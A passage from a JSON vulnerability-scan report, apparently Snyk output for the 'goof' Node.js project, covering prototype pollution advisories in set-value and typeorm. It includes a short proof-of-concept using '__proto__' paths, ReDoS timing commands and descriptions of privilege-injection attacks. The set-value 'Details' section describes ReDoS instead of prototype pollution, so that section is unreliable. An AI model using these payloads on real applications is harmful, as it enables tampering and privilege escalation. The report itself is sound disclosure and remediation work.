              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , extglob@2.0.4 , expand-brackets@2.1.4 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , union-value@1.0.0 , set-value@0.4.3 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , extglob@2.0.4 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , union-value@1.0.0 , set-value@0.4.3 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , nanomatch@1.2.9 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , union-value@1.0.0 , set-value@0.4.3 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , extglob@2.0.4 , expand-brackets@2.1.4 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , union-value@1.0.0 , set-value@0.4.3 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2019-10747"
            ],
            "ghsaid": [
              "4g88-fppr-53pp"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-SETVALUE-450213",
          "desc": "## Overview\n[set-value](https://www.npmjs.com/package/set-value) is a package that creates nested values and any intermediaries using dot notation ('a.b.c') paths.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The function `set-value` could be tricked into adding or modifying properties of `Object.prototype` using any of the `constructor`, `prototype` and `_proto_` payloads.\r\n\r\n## PoC by Snyk\r\n```\r\nconst setFn = require('set-value');\r\nconst paths = [\r\n  'constructor.prototype.a0',\r\n  '__proto__.a1',\r\n];\r\n\r\nfunction check() {\r\n  for (const p of paths) {\r\n      setFn({}, p, true);\r\n  }\r\n  for (let i = 0; i < paths.length; i++) {\r\n      if (({})[`a${i}`] === true) {\r\n          console.log(`Yes with ${paths[i]}`);\r\n      }\r\n  }\r\n}\r\n\r\ncheck();\r\n\r\n```\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `set-value` to version 2.0.1, 3.0.1 or higher.\n## References\n- [GitHub Commit](https://github.com/jonschlinkert/set-value/commit/95e9d9923f8a8b4a01da1ea138fcc39ec7b6b15f)\n- [NPM Security Advisory](https://nodesecurity.io/advisories/1012)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2019-06-20T09:40:41.272349Z\",\n  \"credit\": [\n    \"Jon Schlinkert\"\n  ],\n  \"cvssScore\": 7.3,\n  \"description\": \"## Overview\\n[set-value](https://www.npmjs.com/package/set-value) is a package that creates nested values and any intermediaries using dot notation ('a.b.c') paths.\\n\\nAffected versions of this package are vulnerable to Prototype Pollution. The function `set-value` could be tricked into adding or modifying properties of `Object.prototype` using any of the `constructor`, `prototype` and `_proto_` payloads.\\r\\n\\r\\n## PoC by Snyk\\r\\n```\\r\\nconst setFn = require('set-value');\\r\\nconst paths = [\\r\\n  'constructor.prototype.a0',\\r\\n  '__proto__.a1',\\r\\n];\\r\\n\\r\\nfunction check() {\\r\\n  for (const p of paths) {\\r\\n      setFn({}, p, true);\\r\\n  }\\r\\n  for (let i = 0; i < paths.length; i++) {\\r\\n      if (({})[`a${i}`] === true) {\\r\\n          console.log(`Yes with ${paths[i]}`);\\r\\n      }\\r\\n  }\\r\\n}\\r\\n\\r\\ncheck();\\r\\n\\r\\n```\\n\\n## Details\\n\\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\\n\\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\\n\\nLet’s take the following regular expression as an example:\\n```js\\nregex = /A(B|C+)+D/\\n```\\n\\nThis regular expression accomplishes the following:\\n- `A` The string must start with the letter 'A'\\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\n\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\n\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\n\\n```bash\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\n0.04s user 0.01s system 95% cpu 0.052 total\\n\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\n1.79s user 0.02s system 99% cpu 1.812 total\\n```\\n\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\n\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\n\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\n1. CCC\\n2. CC+C\\n3. C+CC\\n4. C+C+C.\\n\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\n\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\n\\n| String | Number of C's | Number of steps |\\n| -------|-------------:| -----:|\\n| ACCCX | 3 | 38\\n| ACCCCX | 4 | 71\\n| ACCCCCX | 5 | 136\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\n\\n\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\nUpgrade `set-value` to version 2.0.1, 3.0.1 or higher.\\n## References\\n- [GitHub Commit](https://github.com/jonschlinkert/set-value/commit/95e9d9923f8a8b4a01da1ea138fcc39ec7b6b15f)\\n- [NPM Security Advisory](https://nodesecurity.io/advisories/1012)\\n\",\n  \"disclosureTime\": \"2019-06-19T09:38:54Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"2.0.1\",\n    \"3.0.1\"\n  ],\n  \"functions\": [\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"index.js\",\n        \"functionName\": \"create\"\n      },\n      \"version\": [\n        \"<0.3.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"index.js\",\n        \"functionName\": \"module.exports\"\n      },\n      \"version\": [\n        \">=0.3.0 <3.0.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"index.js\",\n        \"functionName\": \"set\"\n      },\n      \"version\": [\n        \">=3.0.0 <3.0.1\"\n      ]\n    }\n  ],\n  \"functions_new\": [\n    {\n      \"functionId\": {\n        \"filePath\": \"index.js\",\n        \"functionName\": \"create\"\n      },\n      \"version\": [\n        \"<0.3.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"index.js\",\n        \"functionName\": \"module.exports\"\n      },\n      \"version\": [\n        \">=0.3.0 <3.0.0\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"index.js\",\n        \"functionName\": \"set\"\n      },\n      \"version\": [\n        \">=3.0.0 <3.0.1\"\n      ]\n    }\n  ],\n  \"id\": \"SNYK-JS-SETVALUE-450213\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2019-10747\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-4g88-fppr-53pp\"\n    ],\n    \"NSP\": [\n      \"1012\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2020-12-22T17:02:13.120091Z\",\n  \"moduleName\": \"set-value\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"set-value\",\n  \"patches\": [],\n  \"proprietary\": true,\n  \"publicationTime\": \"2019-06-20T09:38:53Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/jonschlinkert/set-value/commit/95e9d9923f8a8b4a01da1ea138fcc39ec7b6b15f\"\n    },\n    {\n      \"title\": \"NPM Security Advisory\",\n      \"url\": \"https://nodesecurity.io/advisories/1012\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<2.0.1\",\n      \">=3.0.0 <3.0.1\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"tap@11.1.5\",\n    \"nyc@11.9.0\",\n    \"micromatch@3.1.10\",\n    \"snapdragon@0.8.2\",\n    \"base@0.11.2\",\n    \"cache-base@1.0.1\",\n    \"set-value@2.0.0\"\n  ],\n  \"upgradePath\": [],\n  \"isUpgradable\": false,\n  \"isPatchable\": false,\n  \"name\": \"set-value\",\n  \"version\": \"2.0.0\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , set-value@2.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , braces@2.3.2 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , set-value@2.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , extglob@2.0.4 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , set-value@2.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , nanomatch@1.2.9 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , set-value@2.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , set-value@2.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , braces@2.3.2 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , set-value@2.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , extglob@2.0.4 , expand-brackets@2.1.4 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , set-value@2.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , extglob@2.0.4 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , set-value@2.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , nanomatch@1.2.9 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , set-value@2.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , extglob@2.0.4 , expand-brackets@2.1.4 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , set-value@2.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , union-value@1.0.0 , set-value@0.4.3 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , braces@2.3.2 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , union-value@1.0.0 , set-value@0.4.3 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , extglob@2.0.4 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , union-value@1.0.0 , set-value@0.4.3 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , nanomatch@1.2.9 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , union-value@1.0.0 , set-value@0.4.3 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , union-value@1.0.0 , set-value@0.4.3 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , braces@2.3.2 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , union-value@1.0.0 , set-value@0.4.3 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , micromatch@3.1.10 , extglob@2.0.4 , expand-brackets@2.1.4 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , union-value@1.0.0 , set-value@0.4.3 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , extglob@2.0.4 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , union-value@1.0.0 , set-value@0.4.3 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , nanomatch@1.2.9 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , union-value@1.0.0 , set-value@0.4.3 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , test-exclude@4.2.1 , micromatch@3.1.10 , extglob@2.0.4 , expand-brackets@2.1.4 , snapdragon@0.8.2 , base@0.11.2 , cache-base@1.0.1 , union-value@1.0.0 , set-value@0.4.3 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "400"
            ],
            "cveid": [
              "2020-8158"
            ],
            "ghsaid": [
              "pf2j-9qmp-jqr2"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-TYPEORM-590152",
          "desc": "## Overview\n[typeorm](https://www.npmjs.com/package/typeorm) is an ORM that can run in NodeJS, Browser, Cordova, PhoneGap, Ionic, React Native, NativeScript, Expo, and Electron platforms and can be used with TypeScript and JavaScript (ES5, ES6, ES7, ES8).\n\nAffected versions of this package are vulnerable to Prototype Pollution. It allows an attacker that is able to save a specially crafted object to pollute the `Object` prototype and cause side effects on the library/application logic, such as Denial of Service attacks and/or SQL injections.\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `typeorm` to version 0.2.25 or higher.\n## References\n- [GitHub PR](https://github.com/typeorm/typeorm/pull/6096)\n- [HackerOne Report](https://hackerone.com/reports/869574)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:H/E:F\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2020-07-26T08:33:50.048033Z\",\n  \"credit\": [\n    \"phra\"\n  ],\n  \"cvssScore\": 8.3,\n  \"description\": \"## Overview\\n[typeorm](https://www.npmjs.com/package/typeorm) is an ORM that can run in NodeJS, Browser, Cordova, PhoneGap, Ionic, React Native, NativeScript, Expo, and Electron platforms and can be used with TypeScript and JavaScript (ES5, ES6, ES7, ES8).\\n\\nAffected versions of this package are vulnerable to Prototype Pollution. It allows an attacker that is able to save a specially crafted object to pollute the `Object` prototype and cause side effects on the library/application logic, such as Denial of Service attacks and/or SQL injections.\\n\\n## Details\\n\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\n\\nThere are two main ways in which the pollution of prototypes occurs:\\n\\n-   Unsafe `Object` recursive merge\\n    \\n-   Property definition by path\\n    \\n\\n### Unsafe Object recursive merge\\n\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\n```\\nmerge (target, source)\\n\\n  foreach property of source\\n\\n    if property exists and is an object on both the target and the source\\n\\n      merge(target[property], source[property])\\n\\n    else\\n\\n      target[property] = source[property]\\n```\\n<br>  \\n\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\n\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\n\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\n\\n### Property definition by path\\n\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\n\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\n\\n## Types of attacks\\n\\nThere are a few methods by which Prototype Pollution can be manipulated:\\n\\n| Type |Origin  |Short description |\\n|--|--|--|\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\n\\n## Affected environments\\n\\nThe following environments are susceptible to a Prototype Pollution attack:\\n\\n-   Application server\\n    \\n-   Web server\\n    \\n\\n## How to prevent\\n\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\n    \\n2.  Require schema validation of JSON input.\\n    \\n3.  Avoid using unsafe recursive merge functions.\\n    \\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\n    \\n5.  As a best practice use `Map` instead of `Object`.\\n\\n### For more information on this vulnerability type:\\n\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\nUpgrade `typeorm` to version 0.2.25 or higher.\\n## References\\n- [GitHub PR](https://github.com/typeorm/typeorm/pull/6096)\\n- [HackerOne Report](https://hackerone.com/reports/869574)\\n\",\n  \"disclosureTime\": \"2020-07-24T17:20:06Z\",\n  \"exploit\": \"Functional\",\n  \"fixedIn\": [\n    \"0.2.25\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-TYPEORM-590152\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2020-8158\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-pf2j-9qmp-jqr2\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-07-06T14:08:19.915957Z\",\n  \"moduleName\": \"typeorm\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"typeorm\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2020-07-26T13:45:01Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/typeorm/typeorm/pull/6096\"\n    },\n    {\n      \"title\": \"HackerOne Report\",\n      \"url\": \"https://hackerone.com/reports/869574\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<0.2.25\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    